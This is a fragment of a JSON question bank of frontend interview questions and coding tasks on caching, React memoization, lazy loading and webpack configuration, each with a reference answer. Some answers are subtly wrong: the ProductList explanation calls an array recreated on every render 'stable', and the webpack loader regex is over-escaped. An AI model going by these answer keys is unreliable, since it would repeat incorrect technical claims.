            "http_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_caching_6",
          "topic": "Caching Strategies",
          "level": "medium",
          "type": "open",
          "question": "Explain the 'Stale-While-Revalidate' caching strategy in the context of Service Workers. When would you choose this strategy?",
          "answer": "**Stale-While-Revalidate** is a Service Worker caching strategy where:\n1.  The Service Worker immediately returns a cached response if one is available for the requested resource (providing a fast user experience).\n2.  In parallel, it makes a network request to fetch an updated version of the resource.\n3.  Once the network request completes, the Service Worker updates its cache with the fresh response for future requests.\n\n**When to choose this strategy**: \n*   This strategy is ideal for content that needs to be **displayed quickly but also needs to be reasonably fresh**. \n*   It's a good choice for **frequently accessed content that doesn't need to be absolutely real-time**, such as: \n    *   News feed articles (showing slightly older content immediately is better than waiting).\n    *   Social media feeds.\n    *   User profiles.\n    *   Product listings (where a few minutes' staleness is acceptable).\n    *   Any content where displaying *something* quickly is more important than always displaying the *absolute latest* data, but where eventually updating to the latest data is still desired.",
          "analysisPoints": [
            "Clear explanation of the 'Stale-While-Revalidate' mechanism.",
            "Identification of its primary benefit (speed + freshness).",
            "Providing relevant use cases/scenarios."
          ],
          "keyConcepts": [
            "Service Worker",
            "Caching Strategy",
            "Stale-While-Revalidate",
            "Performance",
            "User Experience"
          ],
          "evaluationCriteria": [
            "Understanding of caching strategy",
            "Ability to apply to real-world scenarios"
          ],
          "example": null,
          "tags": [
            "Service Worker",
            "Caching",
            "Performance"
          ],
          "prerequisites": [
            "service_worker_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_caching_7",
          "topic": "Caching Strategies",
          "level": "hard",
          "type": "code",
          "question": "You need to register a Service Worker for your application. The Service Worker (`sw.js`) should pre-cache the `index.html` and `app.js` files during the `install` phase. On subsequent `fetch` requests, it should always try to serve from the cache first; if not found in cache, it should then go to the network. Implement the registration code and the Service Worker logic.\n\n**Main application (e.g., `index.js`):**\n```javascript\n// Your main application entry point\n// Register the service worker here\n```\n\n**Service Worker (`sw.js`):**\n```javascript\n// Service Worker logic\nconst CACHE_NAME = 'my-app-cache-v1';\nconst ASSETS_TO_CACHE = [\n  '/index.html',\n  '/app.js',\n  // Add other static assets here\n];\n\n// Add event listeners for install and fetch\n```",
          "answer": "**Main application (`index.js` or equivalent):**\n```javascript\n// index.js (or equivalent application entry point)\nif ('serviceWorker' in navigator) {\n  window.addEventListener('load', () => {\n    navigator.serviceWorker.register('/sw.js') // Register the service worker\n      .then(registration => {\n        console.log('Service Worker registered with scope:', registration.scope);\n      })\n      .catch(error => {\n        console.error('Service Worker registration failed:', error);\n      });\n  });\n}\n```\n\n**Service Worker (`sw.js`):**\n```javascript\n// sw.js\nconst CACHE_NAME = 'my-app-cache-v1';\nconst ASSETS_TO_CACHE = [\n  '/', // Often important for root path\n  '/index.html',\n  '/app.js'\n];\n\n// Install event: Pre-cache assets\nself.addEventListener('install', event => {\n  console.log('[Service Worker] Installing...');\n  event.waitUntil(\n    caches.open(CACHE_NAME)\n      .then(cache => {\n        console.log('[Service Worker] Pre-caching assets:', ASSETS_TO_CACHE);\n        return cache.addAll(ASSETS_TO_CACHE);\n      })\n      .catch(error => {\n        console.error('[Service Worker] Pre-caching failed:', error);\n      })\n  );\n});\n\n// Fetch event: Cache First, then Network strategy\nself.addEventListener('fetch', event => {\n  event.respondWith(\n    caches.match(event.request) // Try to find a match in the cache\n      .then(cachedResponse => {\n        if (cachedResponse) {\n          console.log('[Service Worker] Serving from cache:', event.request.url);\n          return cachedResponse;\n        }\n        // If not found in cache, go to network\n        console.log('[Service Worker] Fetching from network:', event.request.url);\n        return fetch(event.request) // Fetch from network\n          .then(networkResponse => {\n            // Check if response is valid before caching\n            if (!networkResponse || networkResponse.status !== 200 || networkResponse.type !== 'basic') {\n              return networkResponse;\n            }\n            // Clone the response because it's a stream and can only be consumed once\n            const responseToCache = networkResponse.clone();\n            caches.open(CACHE_NAME)\n              .then(cache => {\n                cache.put(event.request, responseToCache);\n              });\n            return networkResponse;\n          });\n      })\n      .catch(error => {\n        console.error('[Service Worker] Fetch failed, and no cache match:', error);\n        // You might want to return a fallback page/asset here\n      })\n  );\n});\n\n// Activate event (optional but good practice for cleanup)\nself.addEventListener('activate', event => {\n  console.log('[Service Worker] Activating...');\n  const cacheWhitelist = [CACHE_NAME];\n  event.waitUntil(\n    caches.keys().then(cacheNames => {\n      return Promise.all(\n        cacheNames.map(cacheName => {\n          if (cacheWhitelist.indexOf(cacheName) === -1) {\n            console.log('[Service Worker] Deleting old cache:', cacheName);\n            return caches.delete(cacheName);\n          }\n        })\n      );\n    })\n  );\n});\n```",
          "options": [],
          "analysisPoints": [
            "Correct Service Worker registration using `navigator.serviceWorker.register`.",
            "Implementing the `install` event to `caches.addAll` pre-defined assets.",
            "Implementing the `fetch` event with a 'Cache First, then Network' strategy.",
            "Handling response cloning for caching.",
            "Including an `activate` event for cache management (cleanup)."
          ],
          "keyConcepts": [
            "Service Worker",
            "Registration",
            "Cache API",
            "Install Event",
            "Fetch Event",
            "Cache First Strategy",
            "PWA"
          ],
          "evaluationCriteria": [
            "Functional Service Worker implementation",
            "Correct caching logic",
            "Adherence to best practices"
          ],
          "example": null,
          "tags": [
            "Service Worker",
            "Caching",
            "Coding",
            "PWA",
            "Offline"
          ],
          "prerequisites": [
            "javascript_promises",
            "fetch_api"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_caching_8",
          "topic": "Caching Strategies",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following statements about HTTP `Cache-Control` header directives is FALSE?",
          "answer": "`no-cache` means the browser should never store a copy of the resource.",
          "options": [
            "`max-age` specifies the maximum time a resource is considered fresh.",
            "`public` allows the response to be cached by any cache.",
            "`immutable` tells the browser that the resource will not change during its lifetime.",
            "`no-cache` means the browser should never store a copy of the resource."
          ],
          "analysisPoints": [
            "Precise understanding of each `Cache-Control` directive.",
            "Common misconception about `no-cache` vs. `no-store`."
          ],
          "keyConcepts": [
            "HTTP Caching",
            "Cache-Control",
            "no-cache",
            "no-store",
            "max-age",
            "immutable"
          ],
          "evaluationCriteria": [
            "Accurate recall of HTTP header directives"
          ],
          "example": "The statement '`no-cache` means the browser should never store a copy of the resource' is FALSE. `no-cache` means that the browser *can* store a copy, but it *must revalidate* that copy with the server before using it for subsequent requests. The directive that prevents any caching whatsoever is `no-store`.",
          "tags": [
            "HTTP",
            "Caching",
            "Performance",
            "MCQ"
          ],
          "prerequisites": [
            "http_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_memoization_1",
          "topic": "React Memoization",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary goal of memoization in React?",
          "answer": "To prevent unnecessary re-renders of components or re-calculations of expensive values/functions by caching results and returning them if inputs haven't changed.",
          "analysisPoints": [
            "Core purpose of memoization.",
            "Mechanism (caching and input comparison).",
            "Target (re-renders, re-calculations)."
          ],
          "keyConcepts": [
            "Memoization",
            "React",
            "Performance Optimization"
          ],
          "evaluationCriteria": [
            "Recall of fundamental concept"
          ],
          "example": null,
          "tags": [
            "React",
            "Performance",
            "Memoization"
          ],
          "prerequisites": [
            "react_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_memoization_2",
          "topic": "React Memoization",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following React components:\n\n```jsx\nimport React, { useState } from 'react';\n\nconst DisplayCount = React.memo(({ count }) => {\n  console.log('DisplayCount rendered');\n  return <div>Count: {count}</div>;\n});\n\nconst Parent = () => {\n  const [value, setValue] = useState(0);\n  const [text, setText] = useState('');\n\n  return (\n    <div>\n      <input type=\"number\" value={value} onChange={e => setValue(Number(e.target.value))} />\n      <input type=\"text\" value={text} onChange={e => setText(e.target.value)} />\n      <DisplayCount count={value} />\n    </div>\n  );\n};\n```\n\nHow many times will 'DisplayCount rendered' be logged if the user types '123' into the *text* input field (starting from an empty input)?",
          "answer": "1 time (initial render)",
          "options": [
            "1 time (initial render)",
            "2 times (initial render + first character typed)",
            "4 times (initial render + one for each character)",
            "It will log indefinitely due to an infinite loop."
          ],
          "analysisPoints": [
            "Understanding of `React.memo`'s shallow comparison.",
            "Recognizing that `DisplayCount`'s `count` prop (which is `value`) does not change when `text` state changes.",
            "Distinguishing between parent and child component re-renders."
          ],
          "keyConcepts": [
            "React.memo",
            "Re-renders",
            "Props Comparison",
            "Shallow Equality"
          ],
          "evaluationCriteria": [
            "Ability to predict React rendering behavior with memoization"
          ],
          "example": "The `DisplayCount` component is wrapped with `React.memo`. This means it will only re-render if its `props` change. In this scenario, `DisplayCount` receives only one prop: `count`, which is tied to the `value` state. When the `text` input changes, the `Parent` component re-renders, but the `value` state (and thus the `count` prop passed to `DisplayCount`) remains unchanged. Therefore, `React.memo` prevents `DisplayCount` from re-rendering, and 'DisplayCount rendered' will only be logged during the initial mount.",
          "tags": [
            "React",
            "Memoization",
            "Performance",
            "MCQ"
          ],
          "prerequisites": [
            "react_memo",
            "react_hooks_useState"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_memoization_3",
          "topic": "React Memoization",
          "level": "hard",
          "type": "open",
          "question": "Explain the use cases for `useCallback` and `useMemo` in React. Provide examples of common pitfalls when using these hooks, particularly related to dependency arrays.",
          "answer": "**`useCallback` (for Memoizing Functions)**:\n*   **Use Case**: Returns a memoized version of a callback function. It's primarily used when passing callbacks down to optimized child components (e.g., components wrapped with `React.memo`) that rely on reference equality to prevent unnecessary re-renders. If a parent component re-renders, JavaScript functions are re-created. This creates a new reference, causing `React.memo` children to re-render even if the function's logic hasn't changed. `useCallback` ensures the function reference remains stable across renders unless its dependencies change.\n*   **Example Scenario**: A parent component passes an `onClick` handler to a `React.memo`-wrapped button child. Without `useCallback`, the `onClick` prop's reference would change on every parent render, forcing the button to re-render. With `useCallback`, the button only re-renders if the dependencies of the `onClick` handler change.\n\n**`useMemo` (for Memoizing Values)**:\n*   **Use Case**: Returns a memoized value. It only recomputes the memoized value when one of its dependencies has changed. This is useful for:\n    1.  **Expensive Calculations**: To avoid re-running computationally intensive functions on every render (e.g., heavy data transformations, filtering large arrays).\n    2.  **Memoizing Object/Array References**: When passing objects or arrays as props to optimized child components (`React.memo`). If an object/array is recreated on every render (e.g., `{ a: value }` or `[item1, item2]`), its reference changes, forcing the child to re-render. `useMemo` keeps the reference stable.\n*   **Example Scenario**: A component filters a large list based on a search term. The filtered list can be memoized with `useMemo`, so the filtering operation only runs when the original list or the search term changes, not on every render of the parent.\n\n**Common Pitfalls with Dependency Arrays:**\n1.  **Omitting Dependencies**: This is the most common pitfall. If you forget to include a variable, state, or prop used inside `useCallback` or `useMemo` in its dependency array, the memoized function/value will 'capture' an outdated value (a stale closure or value) from the render it was first created in. This can lead to bugs where the function operates on stale data.\n    *   *Example*: `const handleClick = useCallback(() => { console.log(count); }, []);` If `count` changes, `handleClick` will always log the initial `count` value because `count` was not in the dependency array.\n2.  **Including Too Many Dependencies**: If you include dependencies that change on every render (e.g., an object created inline `useMemo(() => ..., [{}, []])`), it defeats the purpose of memoization, as the memoized value/function will be re-created just as often as if it weren't memoized, adding overhead without benefit.\n3.  **Mutable Objects as Dependencies**: `useCallback` and `useMemo` perform a shallow comparison of dependencies. If a dependency is a mutable object and its properties change without the object's reference changing, the hook won't detect the change, leading to stale memoized values.\n    *   *Example*: `const data = { value: 1 }; // data object is mutated elsewhere` and `useMemo(() => expensiveOp(data), [data]);`. If `data.value` changes but `data`'s reference stays the same, `expensiveOp` won't re-run.\n4.  **Circular Dependencies**: Less common, but can happen if dependencies are not carefully managed, leading to confusing re-renders or unexpected behavior.",
          "analysisPoints": [
            "Clear differentiation of `useCallback` and `useMemo` use cases.",
            "Understanding of their respective mechanisms (function vs. value memoization).",
            "Detailed explanation of dependency array importance.",
            "Specific examples of pitfalls (stale closures, over-memoization, mutable objects)."
          ],
          "keyConcepts": [
            "React.memo",
            "useCallback",
            "useMemo",
            "Memoization",
            "Performance Optimization",
            "Dependency Array",
            "Stale Closures",
            "Shallow Equality"
          ],
          "evaluationCriteria": [
            "Depth of explanation",
            "Accuracy of use cases and pitfalls",
            "Clarity of examples"
          ],
          "example": null,
          "tags": [
            "React",
            "Memoization",
            "Hooks",
            "Performance",
            "Advanced"
          ],
          "prerequisites": [
            "react_hooks_useState",
            "react_functional_components"
          ],
          "complexity": 9,
          "interviewFrequency": 10,
          "learningPath": "advanced"
        },
        {
          "id": "question_react_memoization_4",
          "topic": "React Memoization",
          "level": "medium",
          "type": "code",
          "question": "The following `ItemList` component receives a `data` prop (an array of objects) and an `onSelectItem` callback. The `data` array can be large, and `onSelectItem` is passed down from a parent. Optimize `ItemList` to prevent unnecessary re-renders when its parent re-renders, but only if `data` or `onSelectItem` haven't shallowly changed.\n\n```jsx\nimport React from 'react';\n\nconst ItemList = ({ data, onSelectItem }) => {\n  console.log('ItemList rendered');\n  return (\n    <ul>\n      {data.map(item => (\n        <li key={item.id} onClick={() => onSelectItem(item.id)}>\n          {item.name}\n        </li>\n      ))}\n    </ul>\n  );\n};\n\n// Assume a parent component is passing data and onSelectItem\n// const Parent = () => {\n//   const [items, setItems] = useState([{ id: 1, name: 'Item 1' }, { id: 2, name: 'Item 2' }]);\n//   const handleSelect = (id) => console.log('Selected:', id);\n//   return <ItemList data={items} onSelectItem={handleSelect} />;\n// };\n```",
          "answer": "```jsx\nimport React from 'react';\n\nconst ItemList = React.memo(({ data, onSelectItem }) => {\n  console.log('ItemList rendered');\n  return (\n    <ul>\n      {data.map(item => (\n        <li key={item.id} onClick={() => onSelectItem(item.id)}>\n          {item.name}\n        </li>\n      ))}\n    </ul>\n  );\n});\n\n// To ensure onSelectItem reference is stable for React.memo in parent:\n// import React, { useState, useCallback } from 'react';\n// \n// const Parent = () => {\n//   const [items, setItems] = useState([{ id: 1, name: 'Item 1' }, { id: 2, name: 'Item 2' }]);\n//   const [counter, setCounter] = useState(0); // Dummy state to cause parent re-renders\n// \n//   // Memoize onSelectItem using useCallback to keep its reference stable\n//   const handleSelect = useCallback((id) => {\n//     console.log('Selected:', id, 'Counter:', counter); \n//   }, [counter]); // Dependency: counter, so it updates if counter changes\n// \n//   return (\n//     <div>\n//       <button onClick={() => setCounter(c => c + 1)}>Increment Parent Counter: {counter}</button>\n//       <ItemList data={items} onSelectItem={handleSelect} />\n//     </div>\n//   );\n// };\n// export default Parent;\n```",
          "options": [],
          "analysisPoints": [
            "Correctly applying `React.memo` to the functional component.",
            "Understanding that `React.memo` performs a shallow comparison of props by default.",
            "Implicitly understanding that parent components also need to memoize functions/objects passed as props using `useCallback`/`useMemo` for `React.memo` to be effective."
          ],
          "keyConcepts": [
            "React.memo",
            "Memoization",
            "Performance",
            "React Hooks"
          ],
          "evaluationCriteria": [
            "Correct use of `React.memo`",
            "Understanding of shallow prop comparison"
          ],
          "example": null,
          "tags": [
            "React",
            "Performance",
            "Memoization",
            "Coding"
          ],
          "prerequisites": [
            "react_functional_components"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_memoization_5",
          "topic": "React Memoization",
          "level": "easy",
          "type": "flashcard",
          "question": "Which React Hook is used to memoize the result of an expensive calculation?",
          "answer": "`useMemo`",
          "analysisPoints": [
            "Recall of specific hook for value memoization."
          ],
          "keyConcepts": [
            "useMemo",
            "Memoization",
            "React Hooks"
          ],
          "evaluationCriteria": [
            "Recall of React Hook functionality"
          ],
          "example": null,
          "tags": [
            "React",
            "Hooks",
            "Memoization"
          ],
          "prerequisites": [
            "react_hooks_useState"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_memoization_6",
          "topic": "React Memoization",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following scenarios is LEAST likely to benefit significantly from using `React.memo`, `useCallback`, or `useMemo`?",
          "answer": "A small, frequently re-rendering component with very simple rendering logic.",
          "options": [
            "A large, complex component that frequently re-renders due to parent updates.",
            "Passing a callback function to a child component optimized with `React.memo`.",
            "An expensive data transformation operation that runs on every render.",
            "A small, frequently re-rendering component with very simple rendering logic."
          ],
          "analysisPoints": [
            "Understanding the trade-off of memoization (cost vs. benefit).",
            "Identifying cases where overhead outweighs gains.",
            "Recognizing scenarios where memoization is highly beneficial."
          ],
          "keyConcepts": [
            "Memoization",
            "Performance Optimization",
            "React.memo",
            "useCallback",
            "useMemo"
          ],
          "evaluationCriteria": [
            "Ability to identify appropriate use cases for memoization"
          ],
          "example": "Memoization adds a small overhead (memory for caching, time for dependency comparison). For a small component with simple rendering logic, the cost of re-rendering might be less than or equal to the cost of memoization. In such cases, the performance gains are negligible, or memoization might even slightly degrade performance due to the added overhead. The other options all represent scenarios where memoization can provide significant performance improvements.",
          "tags": [
            "React",
            "Performance",
            "Memoization",
            "MCQ"
          ],
          "prerequisites": [
            "react_memoization"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_memoization_7",
          "topic": "React Memoization",
          "level": "hard",
          "type": "code",
          "question": "You have a component `ProductList` that receives `products` (an array of objects) and a `filterText` string. The component should display only products whose `name` includes `filterText`. Implement `ProductList` and its parent component `App` such that the expensive filtering operation is memoized, and `ProductList` itself is memoized to prevent unnecessary re-renders when only `App`'s unrelated state changes. `App` also has a `theme` state that causes it to re-render.\n\n```jsx\n// ProductList.jsx\nimport React from 'react';\n\nconst ProductList = ({ products, filterText }) => {\n  // Implement memoized filtering here\n  // console.log('ProductList (component) rendered');\n  // console.log('Filtering products...');\n  // const filteredProducts = products.filter(p => p.name.includes(filterText));\n\n  return (\n    <div>\n      <h3>Filtered Products</h3>\n      {/* Render filtered products */}\n    </div>\n  );\n};\n\n// App.jsx\nimport React, { useState } from 'react';\n// import ProductList from './ProductList';\n\nconst App = () => {\n  const [filter, setFilter] = useState('');\n  const [theme, setTheme] = useState('light'); // Unrelated state\n\n  const allProducts = [\n    { id: 1, name: 'Laptop Pro' },\n    { id: 2, name: 'Mouse Ergonomic' },\n    { id: 3, name: 'Keyboard Mechanical' },\n    { id: 4, name: 'Monitor UltraWide' }\n  ];\n\n  return (\n    <div style={{ background: theme === 'light' ? '#fff' : '#333', color: theme === 'light' ? '#333' : '#fff' }}>\n      <h1>My Store</h1>\n      <input \n        type=\"text\" \n        placeholder=\"Filter products...\" \n        value={filter} \n        onChange={e => setFilter(e.target.value)}\n      />\n      <button onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}>\n        Toggle Theme ({theme})\n      </button>\n      {/* Render ProductList */}\n    </div>\n  );\n};\n\nexport default App;\n```",
          "answer": "**ProductList.jsx**\n```jsx\nimport React, { useMemo } from 'react';\n\nconst ProductList = React.memo(({ products, filterText }) => {\n  console.log('ProductList (component) rendered');\n\n  // Memoize the filtering operation using useMemo\n  const filteredProducts = useMemo(() => {\n    console.log('Filtering products...'); // This should only log when products or filterText changes\n    return products.filter(p => \n      p.name.toLowerCase().includes(filterText.toLowerCase())\n    );\n  }, [products, filterText]); // Dependencies: products array and filterText string\n\n  return (\n    <div>\n      <h3>Filtered Products ({filteredProducts.length})</h3>\n      {filteredProducts.length === 0 ? (\n        <p>No products found.</p>\n      ) : (\n        <ul>\n          {filteredProducts.map(product => (\n            <li key={product.id}>{product.name}</li>\n          ))}\n        </ul>\n      )}\n    </div>\n  );\n});\n\nexport default ProductList;\n```\n\n**App.jsx**\n```jsx\nimport React, { useState } from 'react';\nimport ProductList from './ProductList'; // Import the optimized ProductList\n\nconst App = () => {\n  const [filter, setFilter] = useState('');\n  const [theme, setTheme] = useState('light'); // Unrelated state\n\n  const allProducts = [\n    { id: 1, name: 'Laptop Pro' },\n    { id: 2, name: 'Mouse Ergonomic' },\n    { id: 3, name: 'Keyboard Mechanical' },\n    { id: 4, name: 'Monitor UltraWide' }\n  ];\n\n  console.log('App (component) rendered');\n\n  return (\n    <div style={{ background: theme === 'light' ? '#fff' : '#333', color: theme === 'light' ? '#333' : '#fff' }}>\n      <h1>My Store</h1>\n      <input \n        type=\"text\" \n        placeholder=\"Filter products...\" \n        value={filter} \n        onChange={e => setFilter(e.target.value)}\n      />\n      <button onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}>\n        Toggle Theme ({theme})\n      </button>\n      {/* Render ProductList - allProducts is stable, filter is primitive string */}\n      <ProductList products={allProducts} filterText={filter} />\n    </div>\n  );\n};\n\nexport default App;\n```",
          "options": [],
          "analysisPoints": [
            "Correctly applying `React.memo` to `ProductList` to prevent re-renders when `App`'s `theme` changes.",
            "Using `useMemo` inside `ProductList` to memoize the `filteredProducts` array.",
            "Specifying the correct dependency array for `useMemo` (`products`, `filterText`).",
            "Understanding that `allProducts` (if declared outside or as a stable reference) and `filter` (primitive) are suitable props for `React.memo`'s shallow comparison.",
            "Using `toLowerCase()` for case-insensitive filtering."
          ],
          "keyConcepts": [
            "React.memo",
            "useMemo",
            "Memoization",
            "Performance",
            "React Hooks",
            "Filtering"
          ],
          "evaluationCriteria": [
            "Functional memoization implementation",
            "Correct use of `React.memo` and `useMemo`",
            "Logical dependency array handling"
          ],
          "example": "When the `App` component's `theme` state changes, `App` re-renders. However, `ProductList` is wrapped with `React.memo`. Since its `products` prop (`allProducts`) is a stable array reference and `filterText` is a primitive string, their shallow comparison will indicate no change, and `ProductList` will *not* re-render. Inside `ProductList`, the `useMemo` hook ensures that the `filteredProducts` array is only recomputed when either the `products` array reference or the `filterText` value actually changes. This prevents the potentially expensive filtering operation from running unnecessarily.",
          "tags": [
            "React",
            "Performance",
            "Memoization",
            "Coding",
            "Hooks"
          ],
          "prerequisites": [
            "react_memo",
            "useMemo",
            "react_hooks_useState"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_react_code_splitting_1",
          "title": "Implement a Lazy-Loaded Modal with React.lazy and Suspense",
          "description": "\nYour task is to implement a React application that features a main page and a modal. The modal component (`SettingsModal`) should be lazy-loaded using `React.lazy` and `Suspense`, only when the 'Open Settings' button is clicked. This will demonstrate code splitting for a feature that is not immediately visible.\n\n**Requirements:**\n1.  Create a main `App` component that renders a button to open the modal.\n2.  Create a separate `SettingsModal.jsx` file for the modal component. This component should simply display a title and a 'Close' button.\n3.  Use `React.lazy` to dynamically import `SettingsModal`.\n4.  Wrap the lazy-loaded modal with `Suspense` and provide a loading fallback UI.\n5.  The modal should only render (and thus its chunk load) when a state variable (`showModal`) is true.\n6.  Ensure the 'Close' button within the modal also sets `showModal` to false.\n\nYour solution should simulate a small delay in loading the modal to better observe the `Suspense` fallback.",
          "difficulty": "medium",
          "startingCode": "import React, { useState } from 'react';\n\n// Create a placeholder for SettingsModal.jsx\n// import SettingsModal from './SettingsModal'; // This will be lazy-loaded\n\nconst App = () => {\n  const [showModal, setShowModal] = useState(false);\n\n  const handleOpenModal = () => {\n    setShowModal(true);\n  };\n\n  const handleCloseModal = () => {\n    setShowModal(false);\n  };\n\n  return (\n    <div>\n      <h1>Welcome to My App</h1>\n      <button onClick={handleOpenModal}>Open Settings</button>\n\n      {/* Render the modal conditionally */}\n      {/* Your lazy loading and Suspense implementation goes here */}\n    </div>\n  );\n};\n\nexport default App;\n\n// --- Create this file as SettingsModal.jsx ---\n// import React from 'react';\n// const SettingsModal = ({ onClose }) => {\n//   return (\n//     <div style={{\n//       position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%, -50%)',\n//       backgroundColor: 'white', padding: '20px', border: '1px solid #ccc', zIndex: 1000\n//     }}>\n//       <h2>Settings Modal</h2>\n//       <p>These are your application settings.</p>\n//       <button onClick={onClose}>Close</button>\n//     </div>\n//   );\n// };\n// export default SettingsModal;\n",
          "solutionCode": "import React, { useState, lazy, Suspense } from 'react';\n\n// Create the lazy-loaded component\nconst LazySettingsModal = lazy(() => \n  new Promise(resolve => setTimeout(resolve, 1000)) // Simulate network delay\n  .then(() => import('./SettingsModal'))\n);\n\nconst App = () => {\n  const [showModal, setShowModal] = useState(false);\n\n  const handleOpenModal = () => {\n    setShowModal(true);\n  };\n\n  const handleCloseModal = () => {\n    setShowModal(false);\n  };\n\n  return (\n    <div>\n      <h1>Welcome to My App</h1>\n      <button onClick={handleOpenModal}>Open Settings</button>\n\n      {showModal && (\n        <Suspense fallback={<div>Loading Settings Modal...</div>}> \n          <LazySettingsModal onClose={handleCloseModal} />\n        </Suspense>\n      )}\n    </div>\n  );\n};\n\nexport default App;\n\n// --- SettingsModal.jsx ---\n// import React from 'react';\n//\n// const SettingsModal = ({ onClose }) => {\n//   return (\n//     <div style={{\n//       position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%, -50%)',\n//       backgroundColor: 'white', padding: '20px', border: '1px solid #ccc', zIndex: 1000,\n//       boxShadow: '0 4px 8px rgba(0,0,0,0.2)'\n//     }}>\n//       <h2>Settings Modal</h2>\n//       <p>These are your application settings.</p>\n//       <button onClick={onClose}>Close</button>\n//     </div>\n//   );\n// };\n//\n// export default SettingsModal;\n",
          "testCases": [
            "Initial load: Modal should not be present.",
            "Click 'Open Settings': 'Loading Settings Modal...' text should appear briefly.",
            "After delay: `SettingsModal` content should appear.",
            "Click 'Close' in modal: Modal should disappear."
          ],
          "hints": [
            "Remember to import `lazy` and `Suspense` from 'react'.",
            "The `fallback` prop of `Suspense` is crucial for user experience.",
            "You can simulate a network delay within the `import()` promise for testing purposes.",
            "The lazy-loaded component should be imported in its own separate file."
          ],
          "tags": [
            "React",
            "Code Splitting",
            "Lazy Loading",
            "Suspense",
            "Performance",
            "Modal"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "react_basics",
            "react_hooks_useState"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "react_lazy",
            "react_suspense"
          ]
        },
        {
          "id": "task_bundle_size_1",
          "title": "Configure Webpack for Optimal Production Bundle",
          "description": "\nYour goal is to configure a Webpack setup for a production React application to minimize bundle size and improve caching. You need to implement features like JavaScript minification, code splitting for vendors and common modules, and ensure tree shaking is effective.\n\n**Requirements:**\n1.  Set Webpack's `mode` to 'production'.\n2.  Configure a `TerserPlugin` for JavaScript minification.\n3.  Implement `splitChunks` optimization to:\n    *   Create a separate chunk for `node_modules` (named 'vendors').\n    *   Create a 'common' chunk for modules shared across at least two application chunks.\n    *   Ensure all chunks (synchronous and asynchronous) are considered for splitting.\n4.  Ensure output filenames include a `[contenthash]` for effective long-term caching.\n5.  Add a rule to handle `.js` and `.jsx` files with `babel-loader` (assuming React setup).\n\n**Provided Structure:**\n```\nmy-app/\n├── src/\n│   ├── index.js\n│   ├── components/\n│   │   ├── ComponentA.jsx\n│   │   └── ComponentB.jsx\n│   └── utils/\n│       └── math.js\n└── webpack.config.js\n```",
          "difficulty": "hard",
          "startingCode": "const path = require('path');\n\nmodule.exports = {\n  entry: './src/index.js',\n  output: {\n    filename: 'bundle.js',\n    path: path.resolve(__dirname, 'dist'),\n  },\n  // Add mode, optimization, and module rules here\n  module: {\n    rules: [\n      // Babel loader for React/JS\n      {\n        test: /\\\\.(js|jsx)$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-env', '@babel/preset-react'],\n          },\n        },\n      },\n    ],\n  },\n};\n",
          "solutionCode": "const path = require('path');\nconst TerserPlugin = require('terser-webpack-plugin');\n// const CssMinimizerPlugin = require('css-minimizer-webpack-plugin'); // Uncomment if you have CSS in JS bundles\n\nmodule.exports = {\n  entry: './src/index.js',\n  output: {\n    filename: '[name].[contenthash].js', // Use contenthash for long-term caching\n    path: path.resolve(__dirname, 'dist'),\n    clean: true, // Clean the dist folder before each build\n  },\n  mode: 'production', // Enables tree shaking, minification, and other production optimizations\n  optimization: {\n    minimize: true, // Explicitly enable minimization\n    minimizer: [\n      new TerserPlugin({ // Configure TerserPlugin for JS minification\n        terserOptions: {\n          compress: {\n            drop_console: true, // Drop console.log statements in production\n          },\n        },\n        extractComments: false, // Prevents creating a separate file for comments\n      }),\n      // Uncomment the following if you have CSS in your bundles and want to minify it\n      // new CssMinimizerPlugin(), \n    ],\n    splitChunks: {\n      chunks: 'all', // Apply splitting to all chunks (initial and async)\n      minSize: 20000, // Minimum size of a chunk before it's considered for splitting\n      maxInitialRequests: 20, // Max requests for initial load (to prevent too many small chunks)\n      maxAsyncRequests: 20,   // Max requests for on-demand chunks\n      cacheGroups: {\n        vendor: {\n          test: /[\\\\/]node_modules[\\\\/]/, // Target modules in node_modules\n          name: 'vendors', // Name of the vendor chunk\n          chunks: 'all', // Apply to all types of chunks\n          priority: -10, // Higher priority for vendors\n        },\n        common: {\n          minChunks: 2, // Modules shared by at least 2 chunks\n          name: 'common', // Name of the common chunk\n          chunks: 'all',\n          priority: -20, // Lower priority than vendors\n          reuseExistingChunk: true, // Reuse chunks if possible\n        },\n      },\n    },\n  },\n  module: {\n    rules: [\n      {\n        test: /\\\\.(js|jsx)$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-env', '@babel/preset-react'],\n          },\n        },\n      },\n    ],\n  },\n  // Consider adding a devtool: 'source-map' for production debugging, but ensure it's external\n  // devtool: 'source-map',\n};\n",
          "testCases": [
            "Verify `mode` is 'production'.",
            "Check `output.filename` uses `[contenthash]` (e.g., `main.a1b2c3d4.js`, `vendors.e5f6g7h8.js`).",
